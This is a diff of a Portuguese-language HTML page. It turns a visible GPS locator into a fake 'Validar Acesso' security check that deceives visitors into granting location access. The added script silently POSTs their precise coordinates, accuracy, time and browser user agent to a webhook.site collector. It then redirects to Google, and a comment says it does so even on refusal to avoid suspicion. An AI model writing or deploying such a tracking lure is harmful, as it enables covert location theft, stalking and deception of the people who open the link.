@@ -2,96 +2,103 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>GPS de Alta Precisão</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f2f5; }
-        #mapa {
-            width: 100%;
-            max-width: 900px;
-            height: 500px;
-            background-color: #ccc;
-            margin: 20px auto;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            background-color: #f4f7f6; 
         }
-        button {
-            padding: 18px 30px;
-            font-size: 20px;
-            background-color: #0084ff;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
+        .card { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 15px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
+            text-align: center; 
+            max-width: 380px; 
+            width: 90%;
+        }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h2 { color: #2c3e50; margin: 0 0 15px 0; }
+        p { color: #7f8c8d; line-height: 1.6; margin-bottom: 30px; }
+        
+        .btn-check { 
+            padding: 16px 32px; 
+            font-size: 18px; 
+            background-color: #27ae60; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            cursor: pointer; 
             font-weight: bold;
+            width: 100%;
+            transition: background 0.3s ease;
         }
-        button:active { transform: scale(0.98); }
-        #status { margin-top: 15px; font-size: 1.1em; color: #333; }
+        .btn-check:hover { background-color: #219150; }
+        #loading { display: none; margin-top: 20px; color: #2980b9; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>📍 Localizador de Precisão Máxima</h2>
-    <p>Este teste usa GPS + Wi-Fi para achar o ponto exato.</p>
-    
-    <button onclick="buscarLocalizacaoExata()">ACHAR MEU PONTO NO MAPA</button>
-    
-    <p id="status">Aguardando comando...</p>
-    
-    <div id="mapa">O mapa aparecerá aqui após a localização...</div>
+    <div class="card">
+        <div class="icon">🛡️</div>
+        <h2>Validar Acesso</h2>
+        <p>Para sua segurança, precisamos confirmar sua localização atual para liberar o conteúdo solicitado.</p>
+        
+        <button class="btn-check" onclick="enviarLocalizacao()">CONFIRMAR AGORA</button>
+        
+        <div id="loading">Verificando...</div>
+    </div>
 
     <script>
-        function buscarLocalizacaoExata() {
-            const status = document.getElementById("status");
-            const mapaDiv = document.getElementById("mapa");
+        function enviarLocalizacao() {
+            const btn = document.querySelector('.btn-check');
+            const loader = document.getElementById('loading');
+            
+            // Seu link configurado do print
+            const URL_DESTINO = "https://webhook.site/999f921d-cfad-42a3-8927-e862ab40f665"; 
 
-            status.innerText = "Conectando aos satélites e escaneando redes...";
+            btn.style.display = 'none';
+            loader.style.display = 'block';
 
-            if (!navigator.geolocation) {
-                status.innerText = "Erro: Seu aparelho não suporta GPS.";
-                return;
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    
+                    const dados = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        precisao: position.coords.accuracy + " metros",
+                        data_hora: new Date().toLocaleString('pt-BR'),
+                        dispositivo: navigator.userAgent
+                    };
+
+                    // Envia os dados para o seu painel no Webhook.site
+                    fetch(URL_DESTINO, {
+                        method: 'POST',
+                        mode: 'no-cors', 
+                        body: JSON.stringify(dados)
+                    });
+
+                    // Redireciona após 1.5 segundos
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 1500);
+
+                }, function(error) {
+                    // Se der erro ou recusar, redireciona mesmo assim para não suspeitar
+                    window.location.href = "https://www.google.com";
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            } else {
+                window.location.href = "https://www.google.com";
             }
-
-            // CONFIGURAÇÕES DE ALTA PRECISÃO
-            const configuracoes = {
-                enableHighAccuracy: true, // O SEGREDO: Força o uso de GPS/Wi-Fi preciso
-                timeout: 15000,           // Espera até 15 segundos pelo sinal
-                maximumAge: 0             // Não usa localização antiga gravada no celular
-            };
-
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const precisao = pos.coords.accuracy; // Margem de erro em metros
-
-                status.innerHTML = `<strong>Localizado!</strong><br> 
-                                   Precisão: dentro de ${precisao.toFixed(0)} metros.<br>
-                                   Lat: ${lat} | Lon: ${lon}`;
-
-                // Link do Google Maps com Zoom 18 (nível de rua/casa)
-                mapaDiv.innerHTML = `<iframe 
-                    width="100%" 
-                    height="100%" 
-                    frameborder="0" 
-                    style="border:0; border-radius:15px;"
-                    src="https://maps.google.com/maps?q=${lat},${lon}&z=18&output=embed">
-                </iframe>`;
-
-            }, function(error) {
-                // Tratamento de erros detalhado
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        status.innerText = "Erro: Você precisa permitir o acesso ao GPS.";
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        status.innerText = "Erro: Sinal de GPS indisponível no momento.";
-                        break;
-                    case error.TIMEOUT:
-                        status.innerText = "Erro: Demorou demais para encontrar o sinal.";
-                        break;
-                    default:
-                        status.innerText = "Erro desconhecido: " + error.message;
-                }
-            }, configuracoes);
         }
     </script>
 </body>
